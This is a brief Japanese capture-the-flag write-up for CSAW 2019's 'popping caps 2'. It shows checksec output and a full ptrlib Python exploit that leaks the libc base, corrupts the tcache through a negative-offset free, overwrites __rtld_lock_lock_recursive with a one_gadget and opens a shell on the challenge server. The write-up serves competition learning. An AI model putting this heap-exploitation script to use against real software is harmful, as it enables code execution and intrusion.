# [pwn 350pts] popping caps 2 - CSAW CTF Qualification 2019
64ビットバイナリで、RELRO以外有効です。
```
$ checksec -f popping_caps
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
No RELRO        Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   79 Symbols     Yes      0               6       popping_caps
```
一見popping capsと同じですが、よく見るとwriteできるサイズが大きくなっているのと、終了時にmallocされなくなっています。考え直すのが面倒なので`__rtld_lock_lock_recursive`を使いました。（は？）
動くone gadgetが無いのですが、探索レベルを上げればぎりぎり起動するgadgetが見つかります。
```python
from ptrlib import *

def malloc(size):
    sock.sendlineafter(": \n", "1")
    sock.sendlineafter(": \n", str(size))
    return

def free(ofs):
    sock.sendlineafter(": \n", "2")
    sock.sendlineafter(": \n", str(ofs))
    return

def write(data):
    sock.sendlineafter(": \n", "3")
    sock.sendafter(": \n", data)
    return

libc = ELF("./libc.so.6")
#sock = Process("./popping_caps")
sock = Socket("pwn.chal.csaw.io", 1008)

#one_gadget = 0x4f322
#one_gadget = 0x10a3c8
#one_gadget = 0x4f2c5
one_gadget = 0xe569f

# leak libc
sock.recvuntil("system ")
addr_system = int(sock.recvline(), 16)
libc_base = addr_system - libc.symbol("system")
logger.info("libc base = " + hex(libc_base))

malloc(0x3a8)
free(0)
free(-0x210)

malloc(0xf8)
write(p64(libc_base + 0x619f60)) # __rtld_lock_lock_recursive

malloc(0x18)
write(p64(libc_base + one_gadget))
#write(p64(0xffffffffffffffff))

sock.interactive()
```

# 感想
楽して解いてしまつた。
